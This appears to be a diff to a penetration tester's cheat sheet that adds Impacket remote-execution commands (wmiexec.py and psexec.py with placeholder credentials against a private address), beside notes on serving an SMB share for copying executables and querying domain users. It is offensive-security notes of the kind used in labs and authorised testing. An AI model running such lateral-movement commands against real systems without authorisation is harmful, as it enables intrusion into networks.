@@ -48,6 +48,9 @@ Impacket
   SMB Share
     smbserver.py sharename -smb2support directory path (ie. python smbserver.py -smb2support poop /tmp)
       - copy files: xcopy \\10.10.10.14\poop\filename.exe
+  Remote Execution
+  python /usr/share/doc/python-impacket/examples/wmiexec.py username:password@10.10.5.11 'cmd /c ipconfig'
+  python /usr/share/doc/python-impacket/examples/psexec.py username:password@10.10.5.11 'cmd /c ipconfig'
 
 Net Commands
   shell net user username /domain (query domain user)
